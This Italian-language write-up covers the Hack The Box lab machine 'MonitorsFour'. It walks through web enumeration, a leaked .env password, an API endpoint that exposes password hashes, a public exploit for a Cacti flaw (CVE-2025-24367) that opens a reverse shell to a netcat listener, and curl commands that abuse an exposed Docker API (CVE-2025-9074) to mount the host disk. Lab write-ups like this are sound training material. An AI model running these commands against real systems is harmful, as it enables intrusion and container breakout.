+++
date = '2026-08-23T19:22:27+02:00'
draft = false
title = 'MonitorsFour Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`12/12/2025`**

![pwn.png](/images/imgs_monitors4/pwn.png)

---
# Introduzione

**_MonitorsFour_** è una macchina **Windows** di livello **Easy** che presenta un mix di tecniche di enumerazione web e container breakout. Sebbene sia classificata come macchina **Windows**, l'intero percorso di exploitation viene eseguito all'interno di un ambiente **Linux**, senza mai ottenere una shell **Windows** nativa.

Il punto d'accesso iniziale prevede la scoperta di un file **`.env`** esposto e il **fuzzing** di un **endpoint API** per leakare un oggetto **JSON** contenente delle password hashate. Dopo aver craccato gli hash, otteniamo l'accesso ad un'istanza **Cacti** e sfruttiamo una recente **Authenticated RCE** per ottenere una shell all'interno di un container **Linux** in esecuzione sull'host **Windows**.

Per la Privilege Escalation, scopriamo che l'host esegue una versione vulnerabile di **Docker Desktop**. Interagendo con la **Docker API** esposta internamente, possiamo avviare un nuovo container, montare il disco **`C:\`** dell'host e leggere la **root flag** direttamente dal filesystem di **Windows**.

---
# Tecniche Utilizzate

- **Information Disclosure (.env file)**

- **API Fuzzing & Data Leakage**

- **Hash Cracking**

- **Cacti Authenticated RCE (CVE-2025-24367)**

- **Docker Desktop API Abuse (CVE-2025-9074)**

- **Container Breakout via Host Volume Mounting**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- monitors4 -Pn
```

```text
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Scansione mirata con script e rilevamento versioni:

```bash
nmap -sC -sV monitors4 -Pn
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Porte Aperte**:

- **80**/tcp - HTTP

- **5985**/tcp - WinRM (wsman)

## Enumerazione Web

Ho aggiunto **`monitorsfour.htb`** al mio file **`/etc/hosts`**.
La web app sembrava identica a quella di **_MonitorsThree_**, quindi ho testato subito il login form per la stessa **SQL injection**, ma senza risultati.

![web1.png](/images/imgs_monitors4/web1.png)

Ho lanciato una scansione delle directory con **gobuster**:

```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob1.png](/images/imgs_monitors4/gob1.png)

Ho notato un file **`.env`** esposto, che ho prontamente scaricato. Al suo interno le credenziali del database:

![env.png](/images/imgs_monitors4/env.png)

Ho provato a riutilizzare la password **`f37p2j8f4t0r`** sul form di login, ma non ha funzionato.
Quindi, sono passato al fuzzing dei virtual host usando **ffuf**:

```bash
ffuf -u http://monitorsfour.htb -H 'HOST: FUZZ.monitorsfour.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 138
```

![fuff.png](/images/imgs_monitors4/fuff.png)

Ho ottenuto un riscontro con **`cacti`**, che ho aggiunto al mio file **`/etc/hosts`**.
Visitando l'istanza, esponeva la versione: **`Cacti version: 1.2.28`**. 

![cacti.png](/images/imgs_monitors4/cacti.png)

Ho provato a loggarmi anche qui usando le credenziali recuperate, ma nulla.

Ho cercato vulnerabilità relative a questa versione e ho trovato la **CVE-2025-24367** (**Authenticated RCE**). Tuttavia, non avendo ancora accesso alla piattaforma, non era sfruttabile.

Sono tornato all'output di **gobuster** e ho visitato l'endpoint **`/users`** che avevo trovato prima.
Ha restituito un errore: **`{"error":"Missing token parameter"}`**.

![user.png](/images/imgs_monitors4/user.png)

Ho testato manualmente questo parametro nell'**URL**:

```text
http://monitorsfour.htb/users?token=0
```

![token.png](/images/imgs_monitors4/token.png)

Ha restituito un oggetto **JSON** contenente informazioni sensibili. Per visualizzarlo meglio, ho incollato l'output in un file e l'ho passato in pipe a **jq**:

```bash
cat token | jq .
```

Conteneva le password hashate di vari utenti. Ho usato [CrackStation](https://crackstation.net/) per testarle e ho craccato con successo l'hash di **admin**, **`wonderful1`**.

![cracked.png](/images/imgs_monitors4/cracked.png)

---
# Accesso Iniziale | Cacti RCE

Ho usato la password craccata per accedere alla piattaforma principale come utente **admin**.

![logged.png](/images/imgs_monitors4/logged.png)

All'interno non ho notato nulla di immediatamente utile, a parte la versione di **Docker** esposta nella sezione **changelog**: **`Docker Desktop 4.44.2`**.

![docker.png](/images/imgs_monitors4/docker.png)

A quel punto ho provato a usare **`admin:wonderful1`** nel login di **Cacti**, ma ha fallito.
Poi mi sono ricordato che nelle prime macchine della saga **_Monitors_**, l'utente principale si chiamava **`marcus`**. Ho provato **`marcus:wonderful1`** e sono riuscito a loggarmi con successo.

![cacti_logged.png](/images/imgs_monitors4/cacti_logged.png)

**Nota**: _Il nome dell'**Admin** era stato esposto in precedenza anche nell'oggetto **JSON**: **`"name": "Marcus Higgins"`**. Questo ha confermato il collegamento con l'utente **`marcus`** delle macchine precedenti._

Ora che ero autenticato, potevo testare la **CVE** trovata prima.

**Nota**: _La **CVE-2025-24367** è un'**Authenticated Remote Code Execution** che affligge **`Cacti 1.2.28`**. In genere coinvolge una scarsa sanitizzazione in un endpoint autenticato vulnerabile, permettendo a utenti con accesso base di **eseguire comandi arbitrari** sul sistema sottostante._

Inizialmente volevo testarla manualmente, ma cercando la **CVE** ho trovato un **PoC** scritto da **TheCyberGeek**, il creatore di questa macchina. Essendo stato scritto dall'autore stesso, sapevo che probabilmente avrebbe funzionato senza intoppi.

L'ho scaricato da: **https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC**

Mi sono messo in ascolto:

```bash
nc -lvnp 22667
```

E ho lanciato l'exploit:

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.152 -l 22667 -url http://cacti.monitorsfour.htb
```

![init1.png](/images/imgs_monitors4/init1.png)

![init_access.png](/images/imgs_monitors4/init_access.png)

Ho ottenuto una reverse shell come **`www-data`** e ho potuto recuperare direttamente la **user flag** dalla home directory di **`marcus`** senza alcun ulteriore movimento laterale.

![userf.png](/images/imgs_monitors4/userf.png)

---
# Privilege Escalation | Docker Desktop Breakout

Dalla mia shell, ho provato a connettermi al database usando le credenziali leakate dal **`.env`**, ma senza successo.

![db_fail.png](/images/imgs_monitors4/db_fail.png)

Ho letto il file di configurazione di **Cacti** per confermare che fossero le credenziali corrette:

```bash
cat /var/www/html/cacti/include/config.php
```

Ed effettivamente lo erano.
Inizialmente ero bloccato e non sapevo cosa fare. Poi mi sono ricordato della versione di **Docker** trovata prima nella sezione **changelog**: **`Docker Desktop 4.44.2`**.

Cercando online vettori di privilege escalation relativi a questa versione, ho trovato la **CVE-2025-9074**:

- **https://blog.qwertysecurity.com/Articles/blog3**

**Nota**: _La **CVE-2025-9074** si riferisce a una vulnerabilità in **Docker Desktop** dove il daemon della **Docker API** potrebbe essere esposto sull'interfaccia di rete virtuale interna (in questo caso, **`192.168.65.7:2375`**). Un attaccante all'interno di un container può comunicare con questa **API** senza autenticazione per avviare nuovi container privilegiati o montare il filesystem dell'host, evadendo di fatto dal container (breakout)._

Ho riadattato il **PoC** alla fine dell'articolo per adattarlo al mio scenario, usando **curl** dato che **wget** non era presente su questo container.

Ho inviato una richiesta **POST** per creare un nuovo container:

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine", "Tty": true, "Cmd":["sh", "-c", "cat /mnt/users/administrator/desktop/root.txt"], "HostConfig":{"Binds":["/run/desktop/mnt/host/c/:/mnt"]}}'
```

**Nota**: _Questo specifico comando **curl** interagisce con la **Docker API** interna per creare un nuovo container utilizzando l'immagine **alpine**. L'aspetto fondamentale è che l'array **`Binds`** all'interno di **`HostConfig`** mappa il disco **`C:\`** dell'host **Windows** su **`/mnt`** all'interno del container. Il **`Cmd`** è poi impostato semplicemente per fare il **cat** del file **`root.txt`** dal filesystem dell'host._

Ha restituito l'**ID** del container appena creato.

![created.png](/images/imgs_monitors4/created.png)

L'ho avviato usando quell'**ID**:

```bash
curl -s -X POST http://192.168.65.7:2375/containers/32004fac0f80b0cdf02c00aeba82f5f839edaf06915d40fd9b4f4e7bf5f3c3b8/start
```

Infine, ho recuperato la **root flag** direttamente dai log del container:

```bash
curl -s "http://192.168.65.7:2375/containers/32004fac0f80b0cdf02c00aeba82f5f839edaf06915d40fd9b4f4e7bf5f3c3b8/logs?stdout=1&stderr=1"
```

![rootf.png](/images/imgs_monitors4/rootf.png)

---
# Considerazioni Finali

Box **Easy** divertente e lineare. Riutilizzare il layout di **_MonitorsThree_** per creare un falso senso di familiarità è stata una bella trovata. Il punto d'accesso iniziale premia una solida enumerazione di base e l'intuizione di uscire dagli schemi fuzzando i parametri API. La fase di privilege escalation è una brillante dimostrazione di quanto possa essere pericolosa una **Docker API** esposta internamente su un host **Windows**, permettendo un breakout pulito.

**Fonti**:

- **CVE-2025-24367 Cacti PoC | https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC**

- **Docker Desktop API Breakout (CVE-2025-9074) | https://blog.qwertysecurity.com/Articles/blog3**